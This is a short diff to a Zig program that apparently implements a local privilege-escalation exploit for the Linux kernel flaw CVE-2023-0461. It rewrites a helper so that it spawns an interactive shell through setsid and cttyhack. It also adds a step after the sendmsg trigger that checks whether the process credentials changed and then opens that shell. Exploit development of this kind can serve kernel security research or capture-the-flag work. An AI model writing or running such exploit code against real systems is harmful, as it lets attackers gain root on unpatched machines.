@@ -303,7 +303,12 @@ const SyncPipe = struct {
 };
 
 fn sh() !void {
-    var child = std.process.Child.init(&[_][]const u8{"/bin/sh"}, allc);
+    var child = std.process.Child.init(&[_][]const u8{
+        "/bin/setsid",
+        "/bin/cttyhack",
+        "/bin/sh",
+        "-i",
+    }, allc);
 
     _ = try child.spawnAndWait();
 }
@@ -494,6 +499,9 @@ fn cve_2023_0461() !void {
 
         log.info("child: Using sendmsg to trigger push_pending_record", .{});
         _ = try os.sendmsg(client_sk_conn, &cmsg, 0);
+
+        log.info("child: Returned from sendmsg, changed creds?", .{});
+        try sh();
 
         try psync.cont(5);
         log.info("child: Goodbye!", .{});
